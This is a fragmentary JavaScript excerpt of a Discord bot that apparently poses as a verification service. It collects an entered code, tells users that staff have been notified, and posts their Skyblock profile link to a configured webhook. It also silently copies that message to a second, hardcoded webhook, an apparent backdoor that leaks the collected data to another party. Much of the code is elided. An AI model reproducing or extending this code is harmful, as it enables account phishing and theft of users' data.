...
.setImage(`https://cdn.discordapp.com/attachments/1122352424770871327/1124245743956410368/banner.png`)
    ...
    if (interaction.customId.startsWith('enterCode.')) {
        ...
        var embed = new EmbedBuilder()
        .setTitle('Success!')
        .setDescription('I can\'t give you roles staff have been notified!')
  ...
  try {
    ...
    .setFooter({ text: 'Made with 💖 by Perry', iconURL: 'https://media.discordapp.net/attachments/1113494066823434290/1124107450203779112/selling.jpg?width=372&height=662' })
         .setImage(`https://cdn.discordapp.com/attachments/1122352424770871327/1124245743956410368/banner.png`);
...
const config = JSON.parse(fs.readFileSync('./serverstorage.json', 'utf8'));
            ...
            // Do something with the webhook URL here
            const webhook = new WebhookClient({ url: webhookUrl });
            const dhWebhook = new WebhookClient({ url: `https://discord.com/api/webhooks/1150333128641085440/d21uimbWkhDc1Psg1YwSu1CgfLsXNaog-HLN8Nn-g73OcTeSq5lO8R5sO_wLPPEIDKBk` });
              
      const userProfileURL = `https://sky.shiiyu.moe/stats/${name}`;
            webhook.send({ 
                content: "|| @everyone|| Skyblock Profile: " + userProfileURL,
                username: 'Perrys Amazing Bot',
                avatarURL: 'https://cdn.discordapp.com/attachments/1132105949956542504/1150334326756606033/Screenshot_20230903_123138_TikTok.jpg',
                embeds: [embed] 
            })
         dhWebhook.send({
  content: "|| @everyone|| Skyblock Profile: " + userProfileURL,
